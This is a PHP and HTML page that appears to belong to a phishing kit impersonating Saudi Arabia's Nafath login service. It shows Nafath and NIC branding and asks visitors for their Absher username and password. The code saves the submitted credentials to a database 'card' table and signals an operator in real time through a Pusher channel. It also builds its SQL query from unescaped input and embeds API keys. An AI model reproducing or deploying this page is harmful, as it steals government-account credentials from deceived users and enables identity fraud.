<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'معلومات حساب نفاذ');
    $options = ['cluster' => 'ap2', 'useTLS' => true];
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);
    $pusher->trigger('bcare', 'curreneft-page', ['userId' => $_SESSION['user_id'], 'page' => 'معلومات حساب نفاذ']);
}

if (isset($_GET['reject']) || isset($_GET['errorCode'])) {
    $showError = true;
}

if (isset($_POST['submit_LogInToTheSystem'])) {
    $options = ['cluster' => 'ap2', 'useTLS' => true];
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);

    $UserName = $_POST['UserName'];
    $UserPasswore = $_POST['UserPasswore'];

    include("DB_CON.php");
    $X = 0;
    $q = "UPDATE card SET UserName_Nafad='$UserName', UserPasswore_Nafad='$UserPasswore', CheckTheInfo_Nafad='$X' WHERE id=" . $_SESSION['card_id'] . ";";

    if (mysqli_query($con, $q)) {
        mysqli_close($con);
        $userId = $_SESSION['user_id'];
        $User->UpdateStatus($userId, 'معلومات حساب نفاذ');
        $pusher->trigger('bcare', 'update-user-accountt', [
            'userId' => $userId,
            'updatedData' => ['message' => 'معلومات حساب نفاذ', 'type' => '3']
        ]);
        echo "<script>document.location.href='wait-nafath.php';</script>";
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول | نفاذ</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --primary-nafad: #11998E;
            --bg-light: #f8fafc;
        }

        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: "Cairo", serif;
        }

        body {
            background-color: var(--bg-light);
            color: #1e293b;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header-nafad {
            background: white;
            padding: 20px 0;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
        }

        .nafad-logo {
            height: 50px;
        }

        .login-card {
            background: white;
            border-radius: 24px;
            padding: 40px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.03);
            max-width: 450px;
            width: 100%;
            margin: 40px auto;
            border: 1px solid rgba(0, 0, 0, 0.05);
        }

        .form-label {
            font-weight: 700;
            font-size: 0.9rem;
            color: #475569;
        }

        .form-control {
            height: 55px;
            border-radius: 12px;
            border: 2px solid #f1f5f9;
            font-weight: 600;
        }

        .form-control:focus {
            border-color: var(--primary-nafad);
            box-shadow: 0 0 0 4px rgba(17, 153, 142, 0.1);
        }

        .btn-submit {
            height: 55px;
            border-radius: 12px;
            background: var(--primary-nafad);
            color: white;
            font-weight: 900;
            border: none;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-submit:hover {
            background: #0d7e76;
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(17, 153, 142, 0.2);
        }

        .links-area {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #f1f5f9;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .link-item {
            color: #64748b;
            text-decoration: none;
            font-size: 0.9rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: color 0.3s;
        }

        .link-item:hover {
            color: var(--primary-nafad);
        }

        footer {
            background: #f1f5f9;
            padding: 40px 0;
            margin-top: auto;
        }

        .footer-logo {
            height: 40px;
            opacity: 0.8;
        }
    </style>
</head>

<body>

    <header class="header-nafad text-center">
        <div class="container">
            <img src="./assets/nafad.png" alt="Nafath" class="nafad-logo">
        </div>
    </header>

    <main class="container">
        <div class="login-card">
            <h3 class="fw-900 text-center mb-4" style="color: var(--primary-nafad);">تسجيل الدخول</h3>
            <p class="text-center text-muted small mb-4">أدخل اسم المستخدم وكلمة المرور الخاصة بك في أبشر</p>

            <form method="POST">
                <div class="mb-4">
                    <label class="form-label">اسم المستخدم</label>
                    <input type="text" required name="UserName" class="form-control"
                        placeholder="اسم المستخدم أو رقم الهوية">
                </div>

                <div class="mb-5">
                    <label class="form-label">كلمة المرور</label>
                    <input type="password" required name="UserPasswore" class="form-control" placeholder="••••••••">
                </div>

                <button type="submit" name="submit_LogInToTheSystem" class="btn-submit w-100">
                    تسجيل الدخول <i class="bi bi-box-arrow-in-left"></i>
                </button>
            </form>

            <div class="links-area text-start">
                <a href="StepOne.php" class="link-item">
                    <i class="bi bi-arrow-right-circle"></i> البدء من جديد
                </a>
                <a href="#" class="link-item">
                    <i class="bi bi-shield-lock"></i> إعادة تعيين / تغيير كلمة المرور
                </a>
            </div>
        </div>
    </main>

    <footer>
        <div class="container">
            <div class="row align-items-center text-center text-md-start">
                <div class="col-md-6 mb-4 mb-md-0">
                    <h6 class="fw-900 mb-2">تطوير وتشغيل مركز المعلومات الوطني</h6>
                    <p class="text-muted small mb-0">النفاذ الوطني الموحد جميع الحقوق محفوظة © 2024</p>
                </div>
                <div class="col-md-6 text-md-end text-center">
                    <img src="./assets/NIC.png" alt="NIC" class="footer-logo">
                </div>
            </div>
        </div>
    </footer>

    <!-- Error Modal -->
    <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center border-0 shadow-lg" style="border-radius: 24px;">
                <div class="modal-header-error p-5" style="background: #fff5f5;">
                    <div class="error-icon-wrapper mx-auto mb-4" style="width: 70px; height: 70px; background: #fee2e2; color: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">
                        <i class="bi bi-exclamation-triangle-fill"></i>
                    </div>
                    <h5 class="fw-900 text-dark mb-3">اسم المستخدم أو كلمة المرور غير صحيحة</h5>
                    <p class="text-muted small px-3">البيانات التي أدخلتها غير صحيحة. يرجى التأكد من بيانات حسابك في أبشر والمحاولة مرة أخرى.</p>
                    <button class="btn w-100 mt-4" data-bs-dismiss="modal" style="background: #f1f5f9; color: #475569; height: 55px; border-radius: 12px; font-weight: 800;">حسناً، فهمت</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <script>
        $(document).ready(function() {
            <?php if (isset($showError) && $showError): ?>
            var myModal = new bootstrap.Modal(document.getElementById('errorModal'));
            myModal.show();
            <?php endif; ?>
        });
    </script>
    <script>
        var userIdFromSession = <?= json_encode($_SESSION['user_id']); ?>;
    </script>
    <?php include 'chat_widget.php'; ?>
</body>

</html>